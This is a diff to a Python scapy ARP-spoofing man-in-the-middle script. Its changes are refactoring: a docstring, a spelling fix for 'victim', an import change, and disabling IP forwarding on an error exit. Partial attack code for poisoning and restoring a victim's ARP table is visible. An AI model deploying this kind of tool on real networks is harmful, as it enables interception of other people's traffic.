@@ -1,9 +1,10 @@
 from scapy.all import *
+
 from constants import *
+from time import sleep
 
 import sys
 import os
-import time
 import platform
 
 
@@ -39,10 +40,16 @@ def get_mac(ip, interface):
 
 
 def done(ip, r, interface):
+    """
+    restoring the session between the targets
+    :param ip: target ip 
+    :param r: router ip
+    :param interface: interface to operate
+    """
     log('Restoring Targets...')
-    victem_mac = get_mac(ip, interface)
+    victim_mac = get_mac(ip, interface)
     gate_mac = get_mac(r, interface)
-    send(ARP(op=2, pdst=r, psrc=ip, hwdst=MAC_ADDRESS_CLEAN_PATTERN, hwsrc=victem_mac), count=7)
+    send(ARP(op=2, pdst=r, psrc=ip, hwdst=MAC_ADDRESS_CLEAN_PATTERN, hwsrc=victim_mac), count=7)
     send(ARP(op=2, pdst=ip, psrc=r, hwdst=MAC_ADDRESS_CLEAN_PATTERN, hwsrc=gate_mac), count=7)
     log('Disabling IP Forwarding...')
     port_forwarding(0)
@@ -68,6 +75,7 @@ def arp_poison(vm, gm, ip, r, interface, cerr=0):
     except AttributeError:
         if cerr == 10:
             log('too much errors handled while waiting libnet, sorry, quiting')
+            port_forwarding(0)
             exit(0)
         cerr += 1
         # recall with error argument
@@ -103,7 +111,7 @@ def mitm(ip, r, interface):
     while 1:
         try:
             arp_poison(victim_mac, gate_mac, ip, r, interface)
-            time.sleep(1.5)
+            sleep(1.5)
         except KeyboardInterrupt:
             done(ip, r, interface)
             break
